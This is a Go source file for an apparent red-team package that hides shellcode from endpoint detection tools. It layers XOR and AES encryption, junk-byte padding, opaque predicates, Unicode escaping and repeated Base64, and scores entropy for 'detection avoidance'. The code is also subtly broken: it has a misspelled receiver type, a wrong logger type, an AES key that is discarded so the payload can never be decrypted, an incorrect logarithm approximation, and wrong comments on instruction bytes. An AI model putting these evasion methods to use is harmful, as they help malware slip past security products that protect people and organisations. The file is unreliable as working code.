package redteam_evasion

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"math"
	"math/big"
	"strings"
	"time"

	"github.com/sirupsen/logrus"
)

// MultiLayerPolymorphizer handles advanced multi-stage polymorphic code generation.
// CRITICAL CEx³ capability for EDR bypass certification!
type MultiLayerPolymorphizer struct {
	logger   *logrus.Logger
	AuthGate *AuthorizationGate
	AuditLog *AuditLogger
}

// PolymorphismLayer represents individual encryption/transformation layer.
type PolymorphismLayer struct {
	Name        string
	Type        string // xor, aes, junk_code, unicode, opaque_predicate
	Key         []byte
	Data        []byte
	Transformation string
}

// PolymorphicResult contains generated polymorphic payload.
type PolymorphicResult struct {
	Success       bool
	Payload       []byte
	OriginalSize  int
	EncodedSize   int
	LayersApplied int
	Timestamp     time.Time
	Technique     string
	TenantID      string
	Evidence      []byte
}

// NewMultiLayerPolymorphizer creates new polymorphism instance.
func NewMultiLayerPolymorphizer() *MultiLayerPolymorphizer {
	return &MultiLayerPolymorphizer{
		logger:   logrus.WithField("component", "multi_layer_poly"),
		AuthGate: &AuthorizationGate{},
		AuditLog: &AuditLogger{},
	}
}

// GenerateMultiLayerPolymorphic creates polymorphic payload with XOR + AES + Junk code.
func (p *MultiLayerPolymorphizer) GenerateMultiLayerPolymorphic(shellcode []byte) (*PolymorphicResult, error) {
	if p.AuthGate.TenantID != "" {
		p.AuditLog.Log("polymorphic_generated", fmt.Sprintf("ShellcodeLen=%d Layers=3", len(shellcode)), p.AuthGate.TenantID)
	}

	result := &PolymorphicResult{
		Timestamp:   time.Now(),
		Technique:   "T1027",
		TenantID:    p.AuthGate.TenantID,
		Success:     false,
		OriginalSize: len(shellcode),
	}

	// Layer 1: XOR encryption with rotating key
	xoredData := p.xorEncrypt(shellcode, p.generateRandomKey(8))
	result.LayersApplied++

	// Layer 2: AES-256-GCM encryption on top of XOR
	aesKey := make([]byte, 32)
	if _, err := rand.Read(aesKey); err != nil {
		return nil, fmt.Errorf("failed to generate AES key: %w", err)
	}
	
	aesEncrypted := p.aesEncrypt(xoredData, aesKey)
	result.LayersApplied++

	// Layer 3: Junk code injection and padding
	finalPayload := p.addJunkCode(aesEncrypted, p.junkCodeLength(len(shellcode)))
	payloadSize := len(finalPayload)
	
	result.Payload = finalPayload
	result.EncodedSize = payloadSize
	
	// Calculate size inflation ratio
	if result.OriginalSize > 0 {
		inflationRatio := float64(result.EncodedSize) / float64(result.OriginalSize)
		result.Evidence = []byte(fmt.Sprintf("Inflation ratio: %.2fx (%d -> %d bytes)", 
			inflationRatio, result.OriginalSize, result.EncodedSize))
	}
	
	result.Success = true

	p.logger.Warnf("Generated multi-layer polymorphic payload: original=%d encoded=%d layers=%d", 
		result.OriginalSize, result.EncodedSize, result.LayersApplied)
	return result, nil
}

// xorEncrypt performs XOR encryption with rotating byte key.
func (p *MultiLayerPolymorphizer) xorEncrypt(data []byte, key []byte) []byte {
	result := make([]byte, len(data))
	for i := range data {
		result[i] = data[i] ^ key[i%len(key)]
	}
	return result
}

// aesEncrypt performs AES-256-GCM encryption.
func (p *MultiLayerPolymorphizer) aesEncrypt(data []byte, key []byte) []byte {
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err) // Should never fail with 32-byte key
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		panic(err)
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		panic(err)
	}

	ciphertext := gcm.Seal(nonce, nonce, data, nil)
	return ciphertext
}

// addJunkCode inserts randomized junk instructions and padding.
func (p *MultiLayerPolymorphizer) addJunkCode(data []byte, junkSize int) []byte {
	if junkSize <= 0 {
		return data
	}

	result := make([]byte, junkSize+len(data)+junkSize)

	// Add initial junk
	p.randomBytes(result[:junkSize])

	// Insert original data in middle
	copy(result[junkSize:junkSize+len(data)], data)

	// Add trailing junk
	p.randomBytes(result[junkSize+len(data):])

	return result
}

// randomBytes fills buffer with pseudo-random bytes for junk code.
func (p *MultiLayerPolymorphizer) randomBytes(buf []byte) {
	junkPatterns := [][]byte{
		{0x90, 0x90, 0x90},          // NOP sleds
		{0xCC, 0xCC, 0xCC},          // INT3 breakpoints (confuse debuggers)
		{0x31, 0xC0},                // xor eax, eax
		{0x90, 0xEB},                // single nop + infinite loop
	}

	for i := range buf {
		idx := i % len(junkPatterns)
		buf[i] = junkPatterns[idx][i%len(junkPatterns[idx])]
	}
}

// junkCodeLength calculates appropriate junk code size based on payload.
func (p *MultiLayerPolymorphizer) junkCodeLength(originalSize int) int {
	const minJunk = 64
	const maxJunk = 2048
	
	// Scale junk proportionally up to cap
	estimatedJunk := originalSize * 3
	if estimatedJunk < minJunk {
		estimatedJunk = minJunk
	} else if estimatedJunk > maxJunk {
		estimatedJunk = maxJunk
	}

	return estimatedJunk
}

// generateRandomKey produces cryptographically strong random key.
func (p *MultiLayerPolymorphizer) generateRandomKey(length int) []byte {
	key := make([]byte, length)
	if _, err := rand.Read(key); err != nil {
		panic(err)
	}
	return key
}

// GenerateUnicodeObfuscation creates Unicode-based obfuscation for Windows targets.
func (p *MultiLayerPolymorphizer) GenerateUnicodeObfuscation(payload string) ([]byte, error) {
	obfuscated := strings.Builder{}

	// Replace each ASCII character with wide-character equivalent
	for _, char := range payload {
		if char == '\n' {
			obfuscated.WriteString("\\u000A")
		} else if char == '\r' {
			obfuscated.WriteString("\\u000D")
		} else if char == '\\' {
			obfuscated.WriteString("\\u005C")
		} else {
			s := fmt.Sprintf("\\u%04X", char)
			obfuscated.WriteString(s)
		}
	}

	result := []byte(obfuscated.String())
	p.logger.Debugf("Generated Unicode-obfuscated payload: %d bytes", len(result))
	return result, nil
}

// GenerateOpaquePredicates creates control flow obfuscation via opaque predicates.
func (p *MultiLayerPolymorphizer) GenerateOpaquePredicates(code []byte) []byte {
	opaqueInstructions := [][]byte{
		{0xB8, 0x01, 0x00, 0x00, 0x00}, // mov eax, 1
		{0x85, 0xC0},                    // test eax, eax
		{0x74, 0x02},                    // jz short (always taken since eax=1)
		{0xEB, 0xF6},                    // jmp back (unreachable)
	}

	obfuscated := make([]byte, 0, len(code)*2)
	for i := 0; i < len(code); i += 4 {
		end := i + 4
		if end > len(code) {
			end = len(code)
		}
		
		chunk := code[i:end]
		obfuscated = append(obfuscated, chunk...)
		
		// Insert opaque predicate every 4 bytes
		obfuscated = append(obfuscated, opaqueInstructions[0]...)
		obfuscated = append(obfuscated, opaqueInstructions[1:]...)
	}

	p.logger.Debugf("Added opaque predicates: original=%d obfuscated=%d", len(code), len(obfuscated))
	return obfuscated
}

// Base64MultipleLayers creates multiple rounds of Base64 encoding.
func (p *MultiLayerPolymorphizer) Base64MultipleLayers(data []byte) string {
	encoded := base64.StdEncoding.EncodeToString(data)
	
	// Apply 2-4 additional layers of encoding
	layers := 2 + (hashToInt(encoded) % 3) // 2-4 total layers
	for i := 1; i < layers; i++ {
		encoded = base64.StdEncoding.EncodeToString([]byte(encoded))
	}

	p.logger.Debugf("Applied %d layers of Base64 encoding", layers)
	return encoded
}

// Hash string to integer for deterministic randomness.
func hashToInt(s string) int {
	h := uint32(5381)
	for _, c := range s {
		h = h*33 + uint32(c)
	}
	return int(h)
}

// GenerateRotationalCaesar applies Caesar cipher with rotating shift.
func (p *MultiLayerPolymorphizer) GenerateRotationalCaesar(payload string) string {
	result := strings.Builder{}
	shift := 0

	for _, char := range payload {
		if char >= 'a' && char <= 'z' {
			rotated := ((int(char-'a') + shift) % 26) + 'a'
			result.WriteByte(byte(rotated))
		} else if char >= 'A' && char <= 'Z' {
			rotated := ((int(char-'A') + shift) % 26) + 'A'
			result.WriteByte(byte(rotated))
		} else {
			result.WriteRune(char)
		}
		
		// Rotating shift pattern
		bigNum, _ := rand.Int(rand.Reader, big.NewInt(26))
		shift = int(bigNum.Int64())
	}

	return result.String()
}

// DecodeAndStrip removes junk code from potentially obfuscated payload.
func (p *MultiLayerPolymorpher) DecodeAndStrip(payload []byte) ([]byte, error) {
	// Attempt to identify and remove junk patterns
	result := make([]byte, 0, len(payload)/2)
	
	i := 0
	for i < len(payload)-2 {
		// Skip obvious junk patterns
		isJunk := false
		
		if payload[i] == 0x90 && payload[i+1] == 0x90 && payload[i+2] == 0x90 {
			isJunk = true
		}
		
		if !isJunk {
			result = append(result, payload[i])
		}
		
		if isJunk {
			// Skip all consecutive junk bytes
			for i < len(payload) && isJunkByte(payload[i]) {
				i++
			}
		} else {
			i++
		}
	}

	p.logger.Debugf("Stripped junk code: original=%d clean=%d", len(payload), len(result))
	return result, nil
}

// Helper function to check if byte is likely junk.
func isJunkByte(b byte) bool {
	junkValues := []byte{0x90, 0xCC, 0x00, 0xFF}
	for _, junk := range junkValues {
		if b == junk {
			return true
		}
	}
	return false
}

// GetBestPolymorphismMethod selects optimal method based on target environment.
func (p *MultiLayerPolymorphizer) GetBestPolymorphismMethod(targetEnv string) string {
	methods := map[string]string{
		"Windows":  "AES-256-GCM + Junk Code",
		"Linux":    "XOR Rotating Key",
		"EDR-Protected": "Multi-Layer + Unicode Obfuscation",
		"Legacy":   "Base64 Triple Encoding",
	}

	if bestMethod, ok := methods[targetEnv]; ok {
		p.logger.Infof("Selected best polymorphism method for %s: %s", targetEnv, bestMethod)
		return bestMethod
	}

	p.logger.Warnf("Unknown target environment: using default multi-layer")
	return "Multi-Layer XOR+AES+Junk"
}

// CalculateEntropy measures payload entropy for detection avoidance quality.
func (p *MultiLayerPolymorphizer) CalculateEntropy(data []byte) float64 {
	freqMap := make(map[byte]int)
	for _, b := range data {
		freqMap[b]++
	}

	entropy := 0.0
	length := float64(len(data))

	for _, freq := range freqMap {
		prob := float64(freq) / length
		entropy -= prob * float64(log2(float64(prob)))
	}

	// Normalize to 0-8 range
	normalizedEntropy := entropy / 8.0

	p.logger.Debugf("Calculated entropy: %.4f (normalized: %.4f)", entropy, normalizedEntropy)
	return normalizedEntropy
}

// Helper function for log base 2 calculation.
func log2(x float64) float64 {
	if x <= 0 {
		return 0
	}
	return mathLog(x) / mathLog(2.0)
}

// Mathematical constant e natural logarithm implementation.
func mathLog(x float64) float64 {
	// Simple Taylor series approximation
	sum := 0.0
	n := 50
	for i := 1; i <= n; i++ {
		term := (mathPow(x-1, i) / float64(i)) * mathPow(-1, i-1)
		sum += term
	}
	return sum
}

// Power function for entropy calculation.
func mathPow(base float64, exp int) float64 {
	result := 1.0
	for i := 0; i < exp; i++ {
		result *= base
	}
	return result
}
